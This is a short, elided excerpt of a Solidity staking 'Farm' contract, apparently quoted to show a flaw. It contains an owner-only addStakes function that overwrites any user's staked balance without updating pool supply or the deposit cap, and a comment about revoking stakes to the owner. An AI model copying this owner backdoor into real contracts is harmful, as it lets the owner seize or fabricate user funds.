...
contract Farm is Ownable {
    ...
    uint256 public constant MAX_DEPOSIT = 100000 ether; // max amount of staking token allowed.
    ...
    function deposit(uint256 _pid, uint256 _amount) public {
        PoolInfo storage pool = poolInfo[_pid];
        require(pool.supply.add(_amount) <= MAX_DEPOSIT, "deposit: max deposit exceeded");
    ...
    function addStakes(uint _pid, address[] calldata stakers, uint256[] calldata amounts) external onlyOwner {
        for(uint i=0; i<stakers.length; i++){
            userInfo[_pid][stakers[i]].amount = amounts[i];
        }       
    }

    // revoke stakes to contract owner.
